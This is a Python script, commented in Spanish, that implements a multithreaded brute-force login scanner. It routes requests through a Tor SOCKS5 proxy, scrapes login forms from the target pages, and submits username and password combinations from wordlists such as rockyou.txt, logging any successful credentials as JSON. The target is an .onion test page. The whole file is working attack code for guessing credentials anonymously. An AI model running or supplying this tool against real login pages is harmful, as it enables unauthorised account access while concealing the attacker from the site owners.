import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import json

usernames_file = "./dics/usernames.txt"
passwords_file = "./dics/rockyou.txt"

class AdvancedBruteForceScanner:
    
    def __init__(self, urls, proxy_address="127.0.0.1", proxy_port=9050):
        self.urls = urls
        self.session = requests.Session()
        self.proxies = {
            'http': f'socks5h://{proxy_address}:{proxy_port}',
            'https': f'socks5h://{proxy_address}:{proxy_port}'
        }
        self.input_name_users = None
        self.num_threads = 10
        self.results = {}  # Diccionario para almacenar los resultados

    def get_forms(self, url):
        try:
            response = self.session.get(url, proxies=self.proxies, allow_redirects=True)
            response.raise_for_status()
            soup = BeautifulSoup(response.content, "html.parser")
            return soup.find_all("form")
        except requests.exceptions.RequestException as e:
            print(f"Error al acceder a {url}: {e}")
            return []

    def form_details(self, form):
        details_of_form = {}
        action = form.attrs.get("action")
        method = form.attrs.get("method", "get")
        inputs = []

        for input_tag in form.find_all("input"):
            input_type = input_tag.attrs.get("type", "text")
            input_name = input_tag.attrs.get("name")
            input_value = input_tag.attrs.get("value", "")
            inputs.append({
                "type": input_type,
                "name": input_name,
                "value": input_value,
            })

        details_of_form['action'] = action
        details_of_form['method'] = method
        details_of_form['inputs'] = inputs
        return details_of_form

    def login_successful(self, response):
        # Define mensajes de éxito
        success_messages = [
            "Inicio de sesión exitoso!",
            "Login successful!",
            "Welcome",
            # Otros mensajes de éxito que puedan estar presentes
        ]

        # Verifica si alguno de los mensajes está presente en la respuesta
        for message in success_messages:
            if message in response.text:
                return True
        return False

    def send_login_request(self, url, action, method, headers, credentials):
        current_url = self.session.get(url, proxies=self.proxies).url

        try:
            if method == "post":
                res = self.session.post(urljoin(url, action), data=credentials,
                                        headers=headers, proxies=self.proxies, allow_redirects=True)
            elif method == "get":
                res = self.session.get(urljoin(url, action), params=credentials,
                                    headers=headers, proxies=self.proxies, allow_redirects=True)

            res.raise_for_status()

            if self.login_successful(res):
                result = {
                    "url": url,
                    "credentials": credentials,
                    "success": True,
                    "response": res.text
                }
                self.results.setdefault(url, []).append(result)
            elif res.is_redirect:
                new_url = urljoin(url, res.headers.get('location', ''))
                new_response = self.session.get(new_url, proxies=self.proxies, allow_redirects=False)
                new_response_text = new_response.content.decode('utf-8')
                if self.login_successful(new_response):
                    result = {
                        "url": url,
                        "credentials": credentials,
                        "success": True,
                        "response": new_response_text
                    }
                    self.results.setdefault(url, []).append(result)
        except Exception as e:
            pass

    def brute_force(self, usernames_file, passwords_file):
        for url in self.urls:
            input_names = self.find_login_inputs(url)
            if not input_names:
                continue  # Si no se pueden encontrar formularios de inicio de sesión, pasar a la siguiente URL

            with open(usernames_file, 'r') as user_file:
                usernames = [line.strip() for line in user_file]
            with open(passwords_file, 'r') as password_file:
                passwords = [line.strip() for line in password_file]

            credentials_list = [{self.input_name_users[0]: user, self.input_name_users[1]: password} for user in usernames[:10] for password in passwords[:10]]

            threads = []
            for credentials in credentials_list:
                thread = threading.Thread(target=self.send_login_request,
                                          args=(url, input_names['action'], input_names['method'],
                                                {'User-Agent': 'pentest'}, credentials))
                threads.append(thread)
                thread.start()
                if len(threads) >= self.num_threads:
                    for thread in threads:
                        thread.join()
                    threads = []
            for thread in threads:
                thread.join()

        # Convertir los resultados a JSON y devolverlos
        return json.dumps(self.results)

    def find_login_inputs(self, url):
        try:
            response = self.session.get(url, proxies=self.proxies)
            response.raise_for_status()
            soup = BeautifulSoup(response.text, 'html.parser')
            login_inputs = soup.find_all('input', {'type': ['text', 'password']})
            form = soup.find("form")
            input_names = {'action': form['action'], 'method': form['method']}
            print(login_inputs)
            print(input_names)
            self.input_name_users = [input_tag.attrs.get("name") for input_tag in login_inputs]
            print(self.input_name_users)
            return input_names
        except requests.exceptions.RequestException as e:
            print(f"Error: Unable to retrieve content from {url}: {e}")
            return {}
        except KeyError as ke:
            print(f"Error: Unable to find form details: {ke}")
            return {}

if __name__ == "__main__":
    urls = [
        "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_bruteforce/prueba_bruteforce.html",
        # Add more URLs here if needed
    ]
    scanner = AdvancedBruteForceScanner(urls)
    results_json = scanner.brute_force(usernames_file, passwords_file)
    print(results_json)
